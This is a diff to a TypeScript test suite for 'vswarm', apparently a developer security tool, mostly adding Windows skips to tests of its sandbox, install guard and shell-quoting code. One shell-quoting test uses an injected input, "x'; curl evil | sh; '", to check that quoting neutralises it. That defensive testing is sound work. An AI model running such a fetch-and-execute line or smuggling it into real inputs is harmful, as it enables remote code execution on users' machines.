@@ -9,6 +9,10 @@ import { suspiciousLocation } from "../src/sec/collect/system";
 import { sshGate } from "../src/setup";
 import { verdictOf, type Finding } from "../src/sec/types";
 
+// Tests that need sh/zsh/bash, POSIX modes, symlinks, launchd/systemd or Unix paths do not run on Windows (phase 1);
+// test/windows.test.ts covers what vswarm does there.
+const WIN = process.platform === "win32";
+
 const f = (severity: Finding["severity"]): Finding => ({ id: severity, rule: "x", severity, title: severity, detail: [] });
 
 describe("detection", () => {
@@ -17,7 +21,8 @@ describe("detection", () => {
     const missed = r.cases.filter((c) => !c.caught).map((c) => c.name);
     expect(missed).toEqual([]);
     expect(r.falseAlarms.map((x) => x.title)).toEqual([]);
-  });
+    // Windows asks PowerShell for the dropped program's signature, which can take seconds to start.
+  }, 60_000);
 
   test("verdicts: high blocks, medium warns, low passes", () => {
     expect(verdictOf([f("low"), f("info")])).toBe("pass");
@@ -81,7 +86,7 @@ describe("gate", () => {
     expect(g).toContain("ProxyCommand");
   });
 
-  test("preflight exit codes and --then: BLOCK stops the command, PASS runs it", async () => {
+  test.skipIf(WIN)("preflight exit codes and --then: BLOCK stops the command, PASS runs it", async () => {
     const sec = mkdtempSync(join(tmpdir(), "vs-pre-"));
     const env = { ...process.env, VSWARM_SEC_DIR: sec, NO_COLOR: "1" };
     const cli = join(import.meta.dir, "../src/cli.ts");
@@ -120,7 +125,7 @@ import { respond } from "../src/sec/respond";
 import { saveBaseline, loadLock } from "../src/sec/store";
 
 describe("respond", () => {
-  test("locks, keeps evidence with hashes, quarantines on yes, strips added lines, writes reports", async () => {
+  test.skipIf(WIN)("locks, keeps evidence with hashes, quarantines on yes, strips added lines, writes reports", async () => {
     const root = mkdtempSync(join(tmpdir(), "vs-resp-"));
     const home = join(root, "home");
     process.env.VSWARM_SEC_DIR = join(root, "sec");
@@ -187,7 +192,7 @@ describe("vswarm try", () => {
 });
 
 describe("linux persistence", () => {
-  test("systemd units: %h is the home folder, links in *.wants count, packaged links do not", async () => {
+  test.skipIf(WIN)("systemd units: %h is the home folder, links in *.wants count, packaged links do not", async () => {
     const { autostart } = require("../src/sec/collect/system");
     const { symlinkSync } = require("node:fs");
     const home = mkdtempSync(join(tmpdir(), "vs-sd-"));
@@ -205,7 +210,7 @@ describe("linux sandbox", () => {
   const { traceDenials, bwrapArgs } = require("../src/sec/try/linux");
   const box = { dir: "/home/u/.vswarm/try/x", work: "/home/u/.vswarm/try/x/work", home: "/home/u/.vswarm/try/x/home", tmp: "/home/u/.vswarm/try/x/tmp", netlog: "" };
 
-  test("strace lines become the same attempts the macOS sandbox log reports", () => {
+  test.skipIf(WIN)("strace lines become the same attempts the macOS sandbox log reports", () => {
     const d = mkdtempSync(join(tmpdir(), "vs-trace-"));
     const log = join(d, "trace.log");
     writeFileSync(log, [
@@ -230,7 +235,7 @@ describe("linux sandbox", () => {
     ]);
   });
 
-  test("bubblewrap hides every home and /run, keeps the try folder, and has no network", () => {
+  test.skipIf(WIN)("bubblewrap hides every home and /run, keeps the try folder, and has no network", () => {
     const a = bwrapArgs("/home/u", box, { tools: ["/home/u/.bun"], bun: "/home/u/.bun/bin/bun", interactive: false }).join(" ");
     expect(a).toContain("--unshare-net");
     expect(a).toContain("--unshare-pid");
@@ -308,7 +313,7 @@ describe("text that reaches a shell or a terminal", () => {
   const { inner } = require("../src/sec/try/linux");
   const { guardBlock } = require("../src/sec/pkg");
 
-  test("shell words: plain names stay readable, everything else is quoted so it cannot run", () => {
+  test.skipIf(WIN)("shell words: plain names stay readable, everything else is quoted so it cannot run", () => {
     expect(shq("/usr/local/bin/vswarm")).toBe("/usr/local/bin/vswarm");
     expect(shq("a b")).toBe("'a b'");
     expect(shq("x'; curl evil | sh; '")).toBe(`'x'\\''; curl evil | sh; '\\'''`);
@@ -318,7 +323,7 @@ describe("text that reaches a shell or a terminal", () => {
     expect(sh(`printf %s ${dq("a\"b $(echo x) c")}`)).toBe("a\"b $(echo x) c");
   });
 
-  test("generated shell: the install guard and the Linux inner script quote the paths they carry", () => {
+  test.skipIf(WIN)("generated shell: the install guard and the Linux inner script quote the paths they carry", () => {
     const g = guardBlock("/Users/a b/.vswarm/bin/vswarm");
     expect(g).toContain(`'/Users/a b/.vswarm/bin/vswarm' pkg npm -- "$@"`);
     const box = { dir: "/h/u/try x", work: "/h/u/try x/work", home: "/h/u/try x/home", tmp: "/h/u/try x/tmp", netlog: "" };
@@ -480,7 +485,7 @@ describe("install guard", () => {
     expect(r.findings.some((f: any) => f.title === "nice-lib pulls in axois, which looks like axios")).toBe(true);
   });
 
-  test("the shell wrapper checks installs only, and stops when vswarm says no", async () => {
+  test.skipIf(WIN)("the shell wrapper checks installs only, and stops when vswarm says no", async () => {
     const d = mkdtempSync(join(tmpdir(), "vswarm-guard-"));
     const log = join(d, "log");
     // A stand-in vswarm that refuses "evil", and a stand-in npm that records what ran.
@@ -529,7 +534,7 @@ describe("AI agents and MCP", () => {
 });
 
 describe("signed updates", () => {
-  test("updates only to tags signed by the pinned key; unsigned and other-key tags are ignored, older ones refused, pre-releases skipped", async () => {
+  test.skipIf(WIN)("updates only to tags signed by the pinned key; unsigned and other-key tags are ignored, older ones refused, pre-releases skipped", async () => {
     const { secureUpdate, compareVersions } = require("../src/sec/update");
     const root = mkdtempSync(join(tmpdir(), "vs-upd-"));
     const sh = async (cwd: string, ...cmd: string[]) => {
@@ -630,7 +635,7 @@ describe("MCP inspection", () => {
 });
 
 describe("vswarm watch", () => {
-  test("vswarm's own job is not a new login job; the same file edited by someone else is", async () => {
+  test.skipIf(WIN)("vswarm's own job is not a new login job; the same file edited by someone else is", async () => {
     const { jobFiles } = require("../src/sec/schedule");
     const { recordManagedFile } = require("../src/sec/store");
     const { launchd, autostart } = require("../src/sec/collect/system");
